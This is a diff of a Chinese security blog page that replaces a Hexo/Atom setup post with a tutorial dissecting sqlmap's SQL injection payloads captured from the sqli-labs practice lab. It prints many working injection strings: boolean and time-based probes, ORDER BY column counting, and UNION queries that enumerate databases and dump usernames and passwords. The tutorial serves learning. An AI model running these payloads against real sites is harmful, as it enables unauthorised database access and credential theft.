@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
     <title>
         
-        hexo和atom的一些配置 · Yoki Security
+        从sqlmap的payload里学sql注入(1) · Yoki Security
         
     </title>
     <link rel="icon" href= /assets/favicon.ico>
@@ -72,7 +72,7 @@
                 <a href="/" >notyeat</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">hexo和atom的一些配置</a>
+                <a href="#" class="post-name">从sqlmap的payload里学sql注入(1)</a>
             </div>
     </div>
     
@@ -93,7 +93,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            hexo和atom的一些配置
+            从sqlmap的payload里学sql注入(1)
             <!-- 404 -->
             
         </h1>
@@ -111,14 +111,14 @@
             
                 <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-href = 杂谈>杂谈</a>
+        <a class="post-tag" href="javascript:void(0);" data-href = sql注入>sql注入</a>
     
 </div>
             
             <script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "2", "bdMiniList": false, "bdPic": "", "bdStyle": "1", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = "/static/api/js/share.js"];</script>
             <div class="post-intro-meta">
                 <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                <span class="post-intro-time">2018/01/30</span>
+                <span class="post-intro-time">2018/01/31</span>
                 <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                     <span class="iconfont-archer">&#xe604;</span>
                     <span id="busuanzi_value_page_pv"></span>
@@ -201,44 +201,44 @@
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="第一篇文章"><a href="#第一篇文章" class="headerlink" title="第一篇文章"></a>第一篇文章</h1><h5 id="用atom书写markdown的一些小配置"><a href="#用atom书写markdown的一些小配置" class="headerlink" title="用atom书写markdown的一些小配置"></a>用atom书写markdown的一些小配置</h5><p><img src="20180130163923.png" alt=""></p>
-<h2 id="hexo配置"><a href="#hexo配置" class="headerlink" title="hexo配置:"></a>hexo配置:</h2><p>博客用的主题叫做archer，很漂亮。配置也比以前用的NexT来得方便，不会那么繁杂，网上讲hexo的配置很多了，配置也有一堆在贴，我就不再赘述了。在这里讲一下我在写博客的时候传图的办法（PS:如果有更好的办法求私信）</p>
-<p>因为我的Hexo搭建在云服务器里面，传图的解决办法我主要是拿winscp直接拉进去，当然其实有更好的办法，这里强烈推荐一个软件<a href="https://mobaxterm.mobatek.net/" target="_blank" rel="noopener">MobaXterm</a>可以很好的替代Xshell，唯一的缺点就是支持的字符可能没有Xshell多。对了在这里说一下，Xshell付费的问题，可以直接去Xshell官网下Xshell6 Beta版本，很好用也很小清新。</p>
-<p>好了，前面扯了一堆无关紧要的，下面是重点。首先要先在博客<strong>根目录</strong>里的<strong>_config.yml</strong>中把<strong>post_asset_folder</strong>这项配置成true，这样当我们用命令<strong>hexo new xxx</strong>的时候Hexo会给我们生成一个文件夹，这个文件夹里面可以存放截图，然后直接引用那个文件夹中的图片就行了</p>
-<h2 id="atom配置"><a href="#atom配置" class="headerlink" title="atom配置:"></a>atom配置:</h2><p>之前的博客因为没有备份，数据都丢失了。hexo不好的地方就是换电脑写作的时候会没有一些像wordpress这种的方便(可能我没找到其他的好办法)。</p>
-<p>所以这次我想到个办法就是我把我的hexo搭建在了云服务器里面，每次写作可以直接用xshell或者atom上写好再配进去</p>
-<p>这里记录下我配置atom的一些记录:</p>
-<h3 id="用到的插件："><a href="#用到的插件：" class="headerlink" title="用到的插件："></a>用到的插件：</h3><ul>
-<li><p>markdown-preview-enhanced</p>
-</li>
-<li><p>markdown-image-paste</p>
-</li>
-<li><p>markdown-table-editor</p>
-</li>
+        <p>sqli-labs的注入题会自动把注入语句保存下来，正好可以拿来分析sqlmap的一些判断逻辑。</p>
+<h2 id="0x01基础判断："><a href="#0x01基础判断：" class="headerlink" title="0x01基础判断："></a>0x01基础判断：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ID:1</span><br><span class="line">ID:1</span><br><span class="line">ID:1</span><br><span class="line">ID:1</span><br><span class="line">ID:1111</span><br><span class="line">ID:6601</span><br><span class="line">ID:1.)(.&quot;,&apos;(),</span><br><span class="line">ID:1&apos;aWAFUm&lt;&apos;&quot;&gt;avzTly</span><br></pre></td></tr></table></figure>
+<p>当sqlmap注入了这些语句之后，cmd里面开始显示ID有可能有注入了，我把第七和第八条放到浏览器里面执行以下看看会返回什么</p>
+<p><img src="1.png" alt=""></p>
+<p>报错了<br><img src="2.png" alt=""></p>
+<p>我猜可能sqlmap这里是通过后端报错才判断ID这个参数可能含有sql注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ID:1) AND 4934=4934 AND (9042=9042</span><br><span class="line">ID:1 AND 5069=4607</span><br><span class="line">ID:1 AND 4934=4934</span><br><span class="line">ID:1 AND 9291=1408-- bepg</span><br><span class="line">ID:1 AND 4934=4934-- QMjv</span><br><span class="line">ID:1&apos;) AND 9116=4180 AND (&apos;csZG&apos;=&apos;csZG</span><br><span class="line">ID:1&apos;) AND 4934=4934 AND (&apos;MpdM&apos;=&apos;MpdM</span><br><span class="line">ID:1&apos; AND 2732=3589 AND &apos;OZxF&apos;=&apos;OZxF</span><br><span class="line">ID:1&apos; AND 4934=4934 AND &apos;oywa&apos;=&apos;oywa</span><br><span class="line">ID:1&apos; AND 7876=6797 AND &apos;buFy&apos;=&apos;buFy</span><br></pre></td></tr></table></figure>
+<p>这里是是测试了很多的闭合，通过最后三条的不同回显可以判断出来ID参数是有注入点的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID:1&apos;;SELECT SLEEP(5)#</span><br><span class="line">ID:1&apos;;SELECT BENCHMARK(5000000,MD5(0x43635973))#</span><br><span class="line">ID:1&apos;;SELECT BENCHMARK(5000000,MD5(0x4c6e575a)) AND &apos;ulnh&apos;=&apos;ulnh</span><br></pre></td></tr></table></figure></p>
+<p>还有测试延时注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ID:1&apos; ORDER BY 1-- RTQM</span><br><span class="line">ID:1&apos; ORDER BY 7695-- DxQQ</span><br><span class="line">ID:1&apos; ORDER BY 10-- hxSX</span><br><span class="line">ID:1&apos; ORDER BY 6-- gVod</span><br><span class="line">ID:1&apos; ORDER BY 4-- xmFN</span><br><span class="line">ID:1&apos; ORDER BY 3-- SwmN</span><br></pre></td></tr></table></figure>
+<p>这里是猜解表段的阶段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ID:1&apos; UNION ALL SELECT CONCAT(0x71766a6271,0x455545676c6458725446766f674d6d7757704e6d5a504f596a4c7273594c5a4c5a774f4b48796577,0x717a6a7671),NULL,NULL-- eCUs</span><br><span class="line">ID:1&apos; UNION ALL SELECT NULL,CONCAT(0x71766a6271,0x766b6f647972654351767054686a4476517945466b6b764941706d5a645355454561706e506e6867,0x717a6a7671),NULL-- fIrk</span><br><span class="line">ID:1&apos; UNION ALL SELECT NULL,NULL,CONCAT(0x71766a6271,0x54794b6646467373584a5362494f694761714d67506b6f74776173557443474a446579494954776f,0x717a6a7671)-- iIgX</span><br><span class="line">ID:1&apos; UNION ALL SELECT CONCAT(0x71766a6271,0x574f54554d4263447563,0x717a6a7671),NULL,NULL-- AuSG</span><br><span class="line">ID:1&apos; UNION ALL SELECT NULL,CONCAT(0x71766a6271,0x4467766e52684e796670,0x717a6a7671),NULL-- qSlV</span><br><span class="line">ID:1&apos; UNION ALL SELECT NULL,NULL,CONCAT(0x71766a6271,0x42586552676f457a514f,0x717a6a7671)-- GVOH</span><br></pre></td></tr></table></figure>
+<p>sqlmap把字串带进去开始尝试，然后发现第二个字段和第三个字段是可以显示的</p>
+<p>sqlmap通过生成随机的字串来定位程序的输出点是很明智的一种方式，有些无用的语句我直接给省略了没有写出来，下面有用到的函数分析</p>
+<h2 id="淫荡分割线"><a href="#淫荡分割线" class="headerlink" title="淫荡分割线"></a>淫荡分割线</h2><p>用到的函数有：</p>
+<ul>
+<li>IF(x,y,z) :如果x为真，则y，否则z。</li>
+<li>CONCAT(x,y) :SQL CONCAT函数用于将两个字符串连接起来，形成一个单一的字符串。</li>
+<li>ELT(x,y,z..) :通过x来显示输出y或者是z，看例子，其中x可以是个运算式，x相等则输出y：</li>
+<li>BENCHMARK(x,y):执行x次y，比如BENCHMARK(500,md5(1)),这样在sleep函数被过滤的时候可以拿这个函数代替</li>
 </ul>
-<p>主要是图片的粘贴比较麻烦，暂时用markdown-image-paste这个插件来帮忙。markdown-image-paste</p>
-<p>markdown-table-editor这个插件是用来写表格的，比较方便</p>
-<p>atom用的包管理器名字叫做apm，据说是npm的一个分支，不管怎么说，国内被墙了。百度到一些办法贴上来，可以防止安装包和插件的时候有问题</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apm config set strict-ssl false</span><br><span class="line">apm config set https-proxy http://127.0.0.1:1080</span><br><span class="line">apm config set http-proxy http://127.0.0.1:1080</span><br></pre></td></tr></table></figure>
-<p>还有npm的代理:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
+<h2 id="0x02爆数据库名："><a href="#0x02爆数据库名：" class="headerlink" title="0x02爆数据库名："></a>0x02爆数据库名：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ID:-6212&apos; UNION ALL SELECT NULL,CONCAT(0x71766a6271,IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20),0x717a6a7671),NULL FROM INFORMATION_SCHEMA.SCHEMATA-- TKCP</span><br><span class="line"></span><br><span class="line">ID:-8437&apos; UNION ALL SELECT NULL,(SELECT CONCAT(0x71766a6271,IFNULL(CAST(schema_name AS CHAR),0x20),0x717a6a7671) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),NULL-- xtad</span><br><span class="line"></span><br><span class="line">ID:-3108&apos; UNION ALL SELECT NULL,(SELECT CONCAT(0x71766a6271,IFNULL(CAST(schema_name AS CHAR),0x20),0x717a6a7671) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),NULL-- JjAD</span><br><span class="line"></span><br><span class="line">ID:-5712&apos; UNION ALL SELECT NULL,(SELECT CONCAT(0x71766a6271,IFNULL(CAST(schema_name AS CHAR),0x20),0x717a6a7671) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 2,1),NULL-- WFIs</span><br><span class="line"></span><br><span class="line">ID:-4280&apos; UNION ALL SELECT NULL,(SELECT CONCAT(0x71766a6271,IFNULL(CAST(schema_name AS CHAR),0x20),0x717a6a7671) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 3,1),NULL-- JSZL</span><br><span class="line"></span><br><span class="line">ID:-9595&apos; UNION ALL SELECT NULL,(SELECT CONCAT(0x71766a6271,IFNULL(CAST(schema_name AS CHAR),0x20),0x717a6a7671) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 4,1),NULL-- GOoa</span><br><span class="line"></span><br><span class="line">ID:-1518&apos; UNION ALL SELECT NULL,(SELECT CONCAT(0x71766a6271,IFNULL(CAST(schema_name AS CHAR),0x20),0x717a6a7671) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 5,1),NULL-- Sydq</span><br><span class="line"></span><br><span class="line">ID:-8175&apos; UNION ALL SELECT NULL,(SELECT CONCAT(0x71766a6271,IFNULL(CAST(schema_name AS CHAR),0x20),0x717a6a7671) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 6,1),NULL-- xgXw</span><br></pre></td></tr></table></figure>
+<p>这里先说一下sqlmap的思路，就是把爆出来的值先变成字符然后和自己生成的随机字串混合，到时候再从混合的随机字串里面把值取出来</p>
+<p>第一条我们可以看见他用count(schema_name)来查询sechema_name的字段数，也就是数据库的数量，将查出来的值用<a href="https://www.cnblogs.com/yangchunze/p/6667502.html" target="_blank" rel="noopener">CAST()</a>函数变成CHAR类型然后再和随机生成的字串混合</p>
+<p>下面的，因为这是一个普通的注入点没有限制，所以可以直接用查询语句一条一条的把信息通通查询出来</p>
+<p>简化一下注入语句，其实就是<br><img src="3.png" alt=""></p>
+<p>后面的就比较大同小异了,使用 –dump选项的时候，sqlmap爬取信息的时候，会把表中的ID、username、password用生成的随机字串粘在一起，这样就可以一条注入语句输出出一条数据了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ID:-8120&apos; UNION ALL SELECT NULL,(SELECT CONCAT(0x71766a6271,IFNULL(CAST(id AS CHAR),0x20),0x736f6f63626f,IFNULL(CAST(password AS CHAR),0x20),0x736f6f63626f,IFNULL(CAST(username AS CHAR),0x20),0x717a6a7671) FROM security.users LIMIT 0,1),NULL-- eNsa</span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- 前后页  -->
     <ul class="post-pager">
         
-            <li class="next">
-                <a href= "/2018/01/31/python-decorator-1/" title= python的装饰器(上) >
-                    <span>Next Post</span>
-                    <span>python的装饰器(上)</span>
-                </a>
-            </li>
-        
         
             <li class="previous">
-                <a href= "/2018/01/29/hello-world/" title= Hello World >
+                <a href= "/2018/01/31/python-decorator-1/" title= python的装饰器(上) >
                     <span>Previous Post</span>
-                    <span>Hello World</span>
+                    <span>python的装饰器(上)</span>
                 </a>
             </li>
         
@@ -306,7 +306,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#第一篇文章"><span class="toc-number">1.</span> <span class="toc-text">第一篇文章</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#用atom书写markdown的一些小配置"><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">用atom书写markdown的一些小配置</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hexo配置"><span class="toc-number">1.1.</span> <span class="toc-text">hexo配置:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#atom配置"><span class="toc-number">1.2.</span> <span class="toc-text">atom配置:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#用到的插件："><span class="toc-number">1.2.1.</span> <span class="toc-text">用到的插件：</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01基础判断："><span class="toc-number">1.</span> <span class="toc-text">0x01基础判断：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#淫荡分割线"><span class="toc-number">2.</span> <span class="toc-text">淫荡分割线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02爆数据库名："><span class="toc-number">3.</span> <span class="toc-text">0x02爆数据库名：</span></a></li></ol>
     </div>
     
     <div class="back-top">&#xe639;</div>
